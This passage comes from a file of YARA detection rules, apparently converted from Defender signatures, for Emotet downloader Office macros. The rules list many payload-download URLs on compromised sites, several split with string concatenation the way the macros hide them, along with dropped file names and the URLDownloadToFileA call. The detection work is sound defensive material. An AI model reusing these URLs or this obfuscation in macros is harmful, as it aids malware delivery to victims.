        $x_1_6 = "://lu\"&\"zy\"&\"te\"&\"xtu\"&\"ra.c\"&\"o\"&\"m/m\"&\"ar\"&\"fin\"&\"an\"&\"ce/g\"&\"dw\"&\"yL\"&\"ku/" ascii //weight: 1
        $x_1_7 = "://m\"&\"et\"&\"a4\"&\"me\"&\"dia\"&\".c\"&\"o\"&\"m/po\"&\"rtf\"&\"ol\"&\"io\"&\"2/o\"&\"Yo\"&\"ST\"&\"W9\"&\"fo\"&\"tg/" ascii //weight: 1
        $x_1_8 = "://l\"&\"in\"&\"k2t\"&\"ha\"&\"i.c\"&\"o\"&\"m/L\"&\"oc\"&\"k/a\"&\"ZN\"&\"j/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_EIPK_2147818970_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.EIPK!MTB"
        threat_id = "2147818970"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ":/\"&\"/b\"&\"a\"&\"e\"&\"t\"&\"r\"&\"a\"&\"d\"&\"e.c\"&\"o\"&\"m\"&\"/4\"&\"5\"&\"s\"&\"/W\"&\"sT\"&\"3\"&\"C\"&\"vP\"&\"c\"&\"b\"&\"3\"&\"5\"&\"c\"&\"c/" ascii //weight: 1
        $x_1_2 = "://mecaprog.com/menusystemmodel005/zI4Vdv894mr/" ascii //weight: 1
        $x_1_3 = ":/\"&\"/k\"&\"f\"&\"f\"&\"a\"&\"r\"&\"s.\"&\"i\"&\"r/i\"&\"n\"&\"c\"&\"l\"&\"u\"&\"d\"&\"e\"&\"s/P\"&\"r/" ascii //weight: 1
        $x_1_4 = ":/\"&\"/b\"&\"o\"&\"l\"&\"e\"&\"o.n\"&\"l\"&\"/\"&\"a\"&\"s\"&\"s\"&\"e\"&\"t\"&\"s/N\"&\"M\"&\"R\"&\"A\"&\"4\"&\"n\"&\"G\"&\"e\"&\"9\"&\"2\"&\"A\"&\"Z\"&\"v/" ascii //weight: 1
        $x_1_5 = ":/\"&\"/ly\"&\"s\"&\"a\"&\"r\"&\"b\"&\"o\"&\"p\"&\"a\"&\"y\"&\"s\"&\"a\"&\"g\"&\"e.f\"&\"r/h\"&\"e\"&\"a\"&\"d\"&\"e\"&\"r\"&\"s/Z\"&\"Z\"&\"r\"&\"B\"&\"W\"&\"a\"&\"H\"&\"o\"&\"T\"&\"0\"&\"k/" ascii //weight: 1
        $x_1_6 = ":/\"&\"/k\"&\"a\"&\"t\"&\"e\"&\"a\"&\"n\"&\"d\"&\"j\"&\"o\"&\"h\"&\"n.c\"&\"o.u\"&\"k/H\"&\"o\"&\"l\"&\"i\"&\"d\"&\"a\"&\"y\"&\"s/A\"&\"Q/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_KAAK_2147819036_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.KAAK!MTB"
        threat_id = "2147819036"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://b\"&\"u\"&\"l\"&\"l\"&\"d\"&\"o\"&\"g\"&\"i\"&\"r\"&\"o\"&\"n\"&\"w\"&\"o\"&\"r\"&\"k\"&\"s\"&\"l\"&\"l\"&\"c.c\"&\"o\"&\"m/t\"&\"e\"&\"m\"&\"p/I\"&\"V\"&\"H\"&\"D\"&\"0\"&\"0\"&\"G\"&\"G/\",\"" ascii //weight: 1
        $x_1_2 = "://h\"&\"w\"&\"t\"&\"w.c\"&\"o\"&\"m.t\"&\"w/b\"&\"a\"&\"c\"&\"k\"&\"e\"&\"n\"&\"d/a\"&\"l\"&\"e\"&\"r\"&\"t\"&\"i\"&\"f\"&\"y\"&\"j\"&\"s/b\"&\"4\"&\"Q\"&\"y\"&\"f\"&\"c\"&\"O/\",\"" ascii //weight: 1
        $x_1_3 = "://b\"&\"e\"&\"n\"&\"c\"&\"e\"&\"v\"&\"e\"&\"n\"&\"d\"&\"e\"&\"g\"&\"h\"&\"a\"&\"z.h\"&\"u/w\"&\"p-i\"&\"n\"&\"cl\"&\"u\"&\"d\"&\"e\"&\"s/I\"&\"s\"&\"D\"&\"3\"&\"4\"&\"i\"&\"l/\",\"" ascii //weight: 1
        $x_1_4 = "://k\"&\"a\"&\"s\"&\"p\"&\"e\"&\"r\"&\"v\"&\"a\"&\"n\"&\"d\"&\"e\"&\"n\"&\"b\"&\"e\"&\"r\"&\"g.n\"&\"e\"&\"t/2\"&\"0\"&\"0\"&\"9/b\"&\"l\"&\"R\"&\"3\"&\"G\"&\"u/\",\"" ascii //weight: 1
        $x_1_5 = "://k\"&\"a\"&\"m\"&\"er\"&\"a\"&\"l\"&\"a\"&\"r.a\"&\"z/k\"&\"o\"&\"h\"&\"n\"&\"e/u\"&\"p\"&\"g\"&\"r\"&\"a\"&\"d\"&\"e/q\"&\"h\"&\"a\"&\"d\"&\"2\"&\"i\"&\"R\"&\"l\"&\"M\"&\"A\"&\"7\"&\"b\"&\"t\"&\"F/\",\"" ascii //weight: 1
        $x_1_6 = "://l\"&\"i\"&\"v\"&\"r\"&\"e\"&\"s.a\"&\"r\"&\"t.b\"&\"r/e\"&\"rr\"&\"o\"&\"s/g\"&\"f\"&\"y\"&\"E\"&\"w/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ALY_2147819081_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ALY!MTB"
        threat_id = "2147819081"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\\soam1.dll" ascii //weight: 1
        $x_1_2 = "\\soam2.dll" ascii //weight: 1
        $x_1_3 = "\\soam3.dll" ascii //weight: 1
        $x_1_4 = "urlmon" ascii //weight: 1
        $x_1_5 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QPSM_2147819086_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QPSM!MTB"
        threat_id = "2147819086"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "neoexc.com/cgi-bin/gOTeFmMuXhfsGqDl/" ascii //weight: 1
        $x_1_2 = "mythicpeak.com/wp-includes/zGWQ9q3QsWU/" ascii //weight: 1
        $x_1_3 = "demo-re-usables.inertiasoft.net/cgi-bin/z1CD/" ascii //weight: 1
        $x_1_4 = "muhsinsirim.com/cgi-bin/Vt2umvq3ufyBZZWR2HZ/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ESPK_2147819098_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ESPK!MTB"
        threat_id = "2147819098"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "microlent.com/admin/3/" ascii //weight: 1
        $x_1_2 = "mcapublicschool.com/Achievements/r4psv/" ascii //weight: 1
        $x_1_3 = "kuluckaci.com/yarisma/cgi-bin/aIuI4Ukdtl730sP1F/" ascii //weight: 1
        $x_1_4 = "moorworld.com/aspnet_client/fTDJOdTa1USKl43wFtnb/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_EUPK_2147819105_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.EUPK!MTB"
        threat_id = "2147819105"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "www.megakonferans.com/wp-admin/Xzz08i514NBrg/" ascii //weight: 1
        $x_1_2 = "myqservice.com.ar/wp-includes/UamQky9H9rSyN7CWdue/" ascii //weight: 1
        $x_1_3 = "noronhalanches.com.br/cgi-bin/xixssuML9NOJO9/" ascii //weight: 1
        $x_1_4 = "nerz.net/stats/TXGRpKb/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ALZ_2147819108_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ALZ!MTB"
        threat_id = "2147819108"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\\uxevr1.ocx" ascii //weight: 1
        $x_1_2 = "\\uxevr2.ocx" ascii //weight: 1
        $x_1_3 = "\\uxevr3.ocx" ascii //weight: 1
        $x_1_4 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ALAA_2147819136_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ALAA!MTB"
        threat_id = "2147819136"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "t\"&\"tp\"&\"s://w\"&\"w\"&\"w.m\"&\"el\"&\"is\"&\"et\"&\"ot\"&\"oa\"&\"ks\"&\"es\"&\"ua\"&\"r.c\"&\"o\"&\"m/c\"&\"at\"&\"al\"&\"og/c\"&\"on\"&\"tr\"&\"ol\"&\"le\"&\"r/a\"&\"cc\"&\"ou\"&\"nt/d\"&\"qf\"&\"KI/\"" ascii //weight: 1
        $x_1_2 = "t\"&\"t\"&\"p://e\"&\"la\"&\"mu\"&\"rr\"&\"ay.c\"&\"o\"&\"m/a\"&\"th\"&\"le\"&\"ti\"&\"cs-c\"&\"ar\"&\"ni\"&\"va\"&\"l-2\"&\"01\"&\"8/3\"&\"UT\"&\"ZY\"&\"r9\"&\"D9\"&\"f" ascii //weight: 1
        $x_1_3 = "tt\"&\"p://m\"&\"as\"&\"yu\"&\"k.c\"&\"o\"&\"m/58\"&\"1v\"&\"oy\"&\"ze/M\"&\"l\"&\"X/\",\"" ascii //weight: 1
        $x_1_4 = "t\"&\"t\"&\"p://j\"&\"r-s\"&\"of\"&\"tw\"&\"ar\"&\"e-w\"&\"e\"&\"b.n\"&\"e\"&\"t/a\"&\"aa\"&\"ba\"&\"ck\"&\"up\"&\"sq\"&\"ld\"&\"b/1\"&\"1h\"&\"Yk\"&\"3b\"&\"HJ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VZSM_2147819146_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VZSM!MTB"
        threat_id = "2147819146"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "w\"&\"w\"&\"w.cl\"&\"as\"&\"it\"&\"e.c\"&\"o\"&\"m/bl\"&\"og\"&\"s/IE\"&\"Esy\"&\"n/" ascii //weight: 1
        $x_1_2 = "o\"&\"nc\"&\"re\"&\"te-e\"&\"g\"&\"y.c\"&\"o\"&\"m/w\"&\"p-co\"&\"nt\"&\"en\"&\"t/V\"&\"6I\"&\"gz\"&\"w8/" ascii //weight: 1
        $x_1_3 = "op\"&\"en\"&\"ca\"&\"rt-de\"&\"st\"&\"ek.c\"&\"o\"&\"m/c\"&\"at\"&\"al\"&\"og/O\"&\"q\"&\"Hw\"&\"Q8\"&\"xl\"&\"Wa\"&\"5G\"&\"oy\"&\"o/" ascii //weight: 1
        $x_1_4 = "w\"&\"w\"&\"w.p\"&\"je\"&\"sa\"&\"ca\"&\"c.c\"&\"o\"&\"m/co\"&\"mp\"&\"on\"&\"en\"&\"ts/O\"&\"93\"&\"XX\"&\"hM\"&\"N3\"&\"tO\"&\"tT\"&\"lV/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BLA_2147819164_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BLA!MTB"
        threat_id = "2147819164"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "w\"&\"w\"&\"w.b\"&\"er\"&\"ek\"&\"et\"&\"ha\"&\"be\"&\"r.c\"&\"o\"&\"m/h\"&\"at\"&\"ax/f\"&\"ov\"&\"La\"&\"ro" ascii //weight: 1
        $x_1_2 = "b\"&\"os\"&\"ny.c\"&\"o\"&\"m/a\"&\"sp\"&\"ne\"&\"t_cl\"&\"ie\"&\"nt/E\"&\"rI5\"&\"F74\"&\"cw\"&\"ii\"&\"Oy\"&\"we" ascii //weight: 1
        $x_1_3 = "w\"&\"w\"&\"w.c\"&\"es\"&\"as\"&\"in.c\"&\"o\"&\"m.a\"&\"r/ad\"&\"mi\"&\"ni\"&\"str\"&\"at\"&\"or/H\"&\"C46\"&\"kH\"&\"DU\"&\"SY\"&\"N3\"&\"05\"&\"Gg\"&\"lC\"&\"P" ascii //weight: 1
        $x_1_4 = "b\"&\"en\"&\"ce\"&\"ve\"&\"nd\"&\"eg\"&\"ha\"&\"z.hu/w\"&\"p-in\"&\"cl\"&\"ud\"&\"es/t\"&\"XQ\"&\"Bs\"&\"gl\"&\"NO\"&\"Is\"&\"un\"&\"k" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VCSM_2147819198_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VCSM!MTB"
        threat_id = "2147819198"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "v\"&\"ip\"&\"te\"&\"ck.c\"&\"o\"&\"m/w\"&\"p-a\"&\"dm\"&\"in/u\"&\"se\"&\"r/B\"&\"8d\"&\"6j\"&\"r4\"&\"pB\"&\"ND\"&\"2H\"&\"Ex\"&\"Am\"&\"I/lJ\"&\"Wa\"&\"95\"&\"Vl\"&\"Q/" ascii //weight: 1
        $x_1_2 = "s\"&\"al\"&\"le\"&\"de\"&\"mo\"&\"de.c\"&\"o\"&\"m/t\"&\"gr\"&\"ou\"&\"p.g\"&\"e/x\"&\"4b\"&\"c2\"&\"kL\"&\"4B\"&\"zG\"&\"Ae\"&\"Us\"&\"Vi/" ascii //weight: 1
        $x_1_3 = "a\"&\"ir\"&\"li\"&\"ft\"&\"li\"&\"mo.c\"&\"o\"&\"m/w\"&\"p-a\"&\"dm\"&\"in/i\"&\"M\"&\"c/" ascii //weight: 1
        $x_1_4 = "k\"&\"ab\"&\"eo\"&\"ne\"&\"t.p\"&\"l/w\"&\"p-a\"&\"dm\"&\"in/V\"&\"Wl\"&\"Az\"&\"5v\"&\"WJ\"&\"NH\"&\"Db/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_KAAL_2147819205_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.KAAL!MTB"
        threat_id = "2147819205"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://n\"&\"e\"&\"wk\"&\"an\"&\"o.c\"&\"o\"&\"m/w\"&\"p-ad\"&\"mi\"&\"n/6\"&\"6r\"&\"Isr\"&\"Vw\"&\"oP\"&\"KU\"&\"sj\"&\"cA\"&\"s/\",\"Y" ascii //weight: 1
        $x_1_2 = "://o\"&\"ca\"&\"log\"&\"ul\"&\"lar\"&\"i.c\"&\"o\"&\"m/i\"&\"n\"&\"c/W\"&\"cm\"&\"82\"&\"e\"&\"nr\"&\"s8/\",\"^" ascii //weight: 1
        $x_1_3 = "://m\"&\"yp\"&\"ha\"&\"mc\"&\"ua\"&\"tu\"&\"i.c\"&\"o\"&\"m/a\"&\"ss\"&\"et\"&\"s/O\"&\"PV\"&\"eV\"&\"Sp\"&\"O/\",\"" ascii //weight: 1
        $x_1_4 = "://s\"&\"ie\"&\"ut\"&\"hi\"&\"ph\"&\"ut\"&\"un\"&\"gx\"&\"en\"&\"an\"&\"g.c\"&\"o\"&\"m/o\"&\"l\"&\"d_s\"&\"ou\"&\"rc\"&\"e/9\"&\"bo\"&\"JQ\"&\"Zp\"&\"TS\"&\"dQ\"&\"E/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SOS_2147819233_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SOS!MTB"
        threat_id = "2147819233"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://newkano.com/wp-admin/66rIsrVwoPKUsjcAs/\"," ascii //weight: 1
        $x_1_2 = "://ocalogullari.com/inc/Wcm82enrs8/\",\"" ascii //weight: 1
        $x_1_3 = "://myphamcuatui.com/assets/OPVeVSpO/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AIPD_2147819271_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AIPD!MTB"
        threat_id = "2147819271"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://microlent.com/admin/kM442bdMLLMQ1qJe5/" ascii //weight: 1
        $x_1_2 = "://neoexc.com/cgi-bin/srN0xYgm/" ascii //weight: 1
        $x_1_3 = "://ong-hananel.org/PAQUES/bPiA2l6foj7kjN/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AJPD_2147819272_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AJPD!MTB"
        threat_id = "2147819272"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://airliftlimo.com/wp-admin/wzZ3RIsItxZsu77MFxs/" ascii //weight: 1
        $x_1_2 = "://demo-re-usables.inertiasoft.net/cgi-bin/AR4nYNd9xpn/" ascii //weight: 1
        $x_1_3 = "://justplay.asia/google/oCbyPwB8B/" ascii //weight: 1
        $x_1_4 = "://avenuebrasil.com/_img/5KAqQ/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AHPD_2147819273_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AHPD!MTB"
        threat_id = "2147819273"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\\cusoa1.ocx" ascii //weight: 1
        $x_1_2 = "\\cusoa2.ocx" ascii //weight: 1
        $x_1_3 = "\\cusoa3.ocx" ascii //weight: 1
        $x_1_4 = {75 72 6c 6d 6f 6e [0-3] 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVL_2147819283_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVL!MTB"
        threat_id = "2147819283"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "//moaprints.com/Prma3HlbvaG/\",\"" ascii //weight: 1
        $x_1_2 = "//mohammadyarico.com/English/oYJF64dcGKWp7dGrP/\",\"" ascii //weight: 1
        $x_1_3 = "//kronostr.com/tr/Oa97cQB4l4Clf9/\",\"" ascii //weight: 1
        $x_1_4 = "//natdemo.natrixsoftware.com/wp-admin/QyqiN/\",\"" ascii //weight: 1
        $x_1_5 = "//luisangeja.com/COPYRIGHT/BJljffG6/\",\"" ascii //weight: 1
        $x_1_6 = "//nerz.net/stats/KVIyooM/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVL_2147819283_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVL!MTB"
        threat_id = "2147819283"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "//www.nexxdecor.vn/apk/zy8GkZ/\",\"" ascii //weight: 1
        $x_1_2 = "//panscollections.in.th/assets/azHOBDoux/\",\"" ascii //weight: 1
        $x_1_3 = "//n\"&\"at\"&\"io\"&\"nc\"&\"o-o\"&\"p.o\"&\"r\"&\"g/c\"&\"s\"&\"s/8\"&\"wv\"&\"7l\"&\"B5/\",\"" ascii //weight: 1
        $x_1_4 = "//l\"&\"ig\"&\"ht\"&\"my\"&\"fi\"&\"re.i\"&\"n/d\"&\"e\"&\"m\"&\"o/RI\"&\"kA\"&\"FgTFVuaI05r2/\",\"" ascii //weight: 1
        $x_1_5 = "//papillonweb.fr/wp-content/G8z08q0mj/\",\"" ascii //weight: 1
        $x_1_6 = "//brennanasia.com/images/6IwPBHbnUvfgugV1b/\",\"" ascii //weight: 1
        $x_1_7 = "//estacioesportivavilanovailageltru.cat/tmp/IgSyqwgJmE/\",\"" ascii //weight: 1
        $x_1_8 = "//www.supersanmutfak.com/Template/KaYyIBPxMukjoSpAbj/\",\"" ascii //weight: 1
        $x_1_9 = "//vipescortsphuket.com/assets/3TRvF/\",\"" ascii //weight: 1
        $x_1_10 = "//vtklinkerwerken.be/language/lojLdESncV/\",\"" ascii //weight: 1
        $x_1_11 = "//whatelles.nl/css/Kt4CR4p1UGZGQnGY/\",\"" ascii //weight: 1
        $x_1_12 = "//www.teamsave.it/AH0MVCZ5/w0RV6LsZC/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BOAF_2147819300_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BOAF!MTB"
        threat_id = "2147819300"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://bosny.com/aspnet_client/NGTx1FUzq/" ascii //weight: 1
        $x_1_2 = "://www.berekethaber.com/hatax/c7crGdejW4380ORuxqR/" ascii //weight: 1
        $x_1_3 = "://bulldogironworksllc.com/temp/BBh5HHpei/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AKPD_2147819362_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AKPD!MTB"
        threat_id = "2147819362"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://weboculta.com/APPs/jb7urLT2s/" ascii //weight: 1
        $x_1_2 = "://webguruindia.com/theme/A7IdsEk1uJo/" ascii //weight: 1
        $x_1_3 = "://waves-india.com/LC/YolqTCGPcBX0h/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_KAAM_2147819392_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.KAAM!MTB"
        threat_id = "2147819392"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://vickipohl.com/aE3I7qKQVgDzqD1/" ascii //weight: 1
        $x_1_2 = "://www.visionsfantastic.com/images/QXBJ7N7jaXf6pZi2J6/" ascii //weight: 1
        $x_1_3 = "://weareone-bh.org/ik8EFuXqc/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ALPD_2147819431_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ALPD!MTB"
        threat_id = "2147819431"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
